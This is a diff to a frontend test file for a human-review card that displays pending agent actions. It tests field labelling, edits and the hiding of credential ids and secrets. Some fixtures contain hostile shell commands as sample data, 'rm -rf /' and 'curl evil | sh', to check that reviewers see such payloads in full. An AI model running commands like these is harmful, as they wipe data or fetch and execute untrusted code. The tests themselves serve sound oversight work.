@@ -1,6 +1,8 @@
 import { fireEvent } from "@testing-library/react";
+import { http, HttpResponse } from "msw";
 import { expect, test, vi } from "vitest";
 import type { PendingHumanReviewModel } from "@/app/api/__generated__/models/pendingHumanReviewModel";
+import { server } from "@/mocks/mock-server";
 import { render, screen } from "@/tests/integrations/test-utils";
 import { PendingReviewCard } from "../PendingReviewCard";
 
@@ -35,12 +37,11 @@ test("renders every key of a payload that carries a top-level data key", () => {
     />,
   );
 
-  const value = (screen.getByRole("textbox") as HTMLTextAreaElement).value;
-  expect(value).toContain("rm -rf /");
-  expect(value).toContain("tidy up temp files");
+  expect(screen.getByDisplayValue("rm -rf /")).toBeDefined();
+  expect(screen.getByDisplayValue("tidy up temp files")).toBeDefined();
 });
 
-test("renders a bare payload unchanged", () => {
+test("labels each input of a payload instead of printing JSON", () => {
   render(
     <PendingReviewCard
       review={makeReview({ payload: { to: "x@y.com", subject: "Invoice" } })}
@@ -48,12 +49,13 @@ test("renders a bare payload unchanged", () => {
     />,
   );
 
-  const value = (screen.getByRole("textbox") as HTMLTextAreaElement).value;
-  expect(value).toContain("x@y.com");
-  expect(value).toContain("Invoice");
+  expect(screen.getByText("To")).toBeDefined();
+  expect(screen.getByText("Subject")).toBeDefined();
+  expect(screen.getByDisplayValue("Invoice")).toBeDefined();
+  expect(screen.queryByText(/"subject"/)).toBeNull();
 });
 
-test("editing the payload reports the full edited object back, not just one key", () => {
+test("editing one field reports the full edited object back", () => {
   const onReviewDataChange = vi.fn();
 
   render(
@@ -63,11 +65,8 @@ test("editing the payload reports the full edited object back, not just one key"
     />,
   );
 
-  const textarea = screen.getByRole("textbox") as HTMLTextAreaElement;
-  fireEvent.change(textarea, {
-    target: {
-      value: JSON.stringify({ to: "x@y.com", subject: "Updated invoice" }),
-    },
+  fireEvent.change(screen.getByDisplayValue("Invoice"), {
+    target: { value: "Updated invoice" },
   });
 
   expect(onReviewDataChange).toHaveBeenCalledTimes(1);
@@ -90,11 +89,67 @@ test("a non-editable payload is displayed in full", () => {
     />,
   );
 
-  expect(
-    screen.getByText(
-      (_, node) =>
-        node?.tagName === "P" &&
-        (node.textContent ?? "").includes("curl evil | sh"),
+  expect(screen.getByText("curl evil | sh")).toBeDefined();
+  expect(screen.getByText("looks harmless")).toBeDefined();
+  expect(screen.queryByRole("textbox")).toBeNull();
+});
+
+test("uses the block's input schema and never shows the credential id", async () => {
+  server.use(
+    http.get("*/api/builder/blocks/batch", () =>
+      HttpResponse.json([
+        {
+          id: "block-1",
+          name: "SendDiscordMessageBlock",
+          inputSchema: {
+            type: "object",
+            properties: {
+              credentials: {
+                title: "Credentials",
+                credentials_provider: ["discord"],
+              },
+              message_content: {
+                title: "Message Content",
+                type: "string",
+              },
+              webhook_secret: {
+                title: "Webhook Secret",
+                type: "string",
+                secret: true,
+              },
+            },
+          },
+        },
+      ]),
     ),
-  ).toBeDefined();
+  );
+
+  render(
+    <PendingReviewCard
+      review={makeReview({
+        block_id: "block-1",
+        action: "Send Discord Message",
+        payload: {
+          credentials: {
+            id: "cred-uuid-1",
+            provider: "discord",
+            type: "api_key",
+            title: "Launch bot",
+          },
+          message_content: "v2.4 is live",
+          webhook_secret: "s3cr3t", // pragma: allowlist secret
+        },
+      })}
+      onReviewDataChange={() => {}}
+    />,
+  );
+
+  expect(await screen.findByText("Message Content")).toBeDefined();
+  expect(screen.getByDisplayValue("v2.4 is live")).toBeDefined();
+  expect(screen.getByText("Account")).toBeDefined();
+  expect(screen.getByText("Launch bot (Discord)")).toBeDefined();
+  expect(screen.queryByText(/cred-uuid-1/)).toBeNull();
+  expect(screen.queryByText(/s3cr3t/)).toBeNull();
+  expect(screen.queryByDisplayValue("s3cr3t")).toBeNull();
+  expect(screen.queryByText("SendEmailBlock")).toBeNull();
 });
